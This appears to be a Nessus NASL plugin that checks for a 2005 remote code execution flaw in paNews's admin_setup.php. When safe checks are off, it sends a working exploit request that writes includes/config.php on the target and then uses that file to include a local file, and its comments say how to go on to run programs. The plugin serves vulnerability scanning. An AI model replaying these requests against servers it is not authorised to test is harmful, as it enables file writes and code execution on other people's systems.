#
# (C) Tenable Network Security
#


 desc["english"] = "
Synopsis :

The remote web server contains a PHP application that suffers from
multiple flaws. 

Description :

The remote host is running a version of paNews that fails to properly
sanitize input passed to the script 'includes/admin_setup.php' and, in
addition, allows writes by the web user to the directory 'includes'
(not the default configuration).  Taken together, these flaws allow a
remote attacker to run arbitrary code in the context of the user
running the web service or to read arbitrary files on the target. 

See also :

http://archives.neohapsis.com/archives/fulldisclosure/2005-02/0448.html

Solution : 

Change the permissions on the 'includes/' directory so it can not be
written to by the web user. 

Risk factor : 

High / CVSS Base Score : 7
(AV:R/AC:L/Au:NR/C:P/A:P/I:P/B:N)";


if (description) {
  script_id(17201);
  script_version("$Revision: 1.6 $");

  script_bugtraq_id(12611);

  name["english"] = "paNews admin_setup.php Remote Code Execution Vulnerability";
  script_name(english:name["english"]);
 
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for remote code execution in admin_setup.php in paNews";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");
  script_family(english:"CGI abuses");
 
  script_dependencies("panews_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/panews"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches)) {
  ver = matches[1];
  dir = matches[2];

  if (safe_checks()) {
    if (ver =~  "^([0-1]\.|2\.0b[0-4])$") {
      desc = ereg_replace(
        string:desc["english"],
        pattern:"Solution : ",
        replace:string(
          "***** Nessus has determined the vulnerability exists on the target\n",
          "***** simply by looking at the version number of paNews\n",
          "***** installed there.\n",
          "\n",
          "Solution : "
        )
      );
      security_hole(port:port, data:desc);
    }
  }
  else {
    # Create includes/config.php.
    req = http_get(
      # nb: with a slightly different URL, you can run programs on the target.
      item:dir + "/includes/admin_setup.php?access[]=admins&do=updatesets&form[comments]=$nst&form[autoapprove]=$nst&disvercheck=$nst&installed=$asd&showcopy=include($nst)", 
      port:port
    );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
    if (res == NULL) exit(0);

    if (egrep(string:res, pattern:"^HTTP/.* 200 OK")) {
      # And now run it to include paNews Readme.txt in the top-level directory.
      req = http_get(
        # nb: if PHP's allow_url_fopen is enabled, you could also open
        #     remote URLs with arbitrary PHP code.
        item:dir + "/includes/config.php?nst=../Readme.txt", 
        port:port
      );
      res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
      if ("bugs@phparena.net" >< res) {
        desc = ereg_replace(
          string:desc["english"],
          pattern:"Solution : ",
          replace:string(
            "***** In testing for this vulnerability, Nessus has created:\n",
            "*****     ", dir + "/includes/config.php\n",
            "***** in the webserver's document directory. This file should be\n",
            "***** deleted as soon as possible.\n",
            "\n",
            "Solution : "
          )
        );
        security_hole(port:port, data:desc);
      }
    }
  }
}
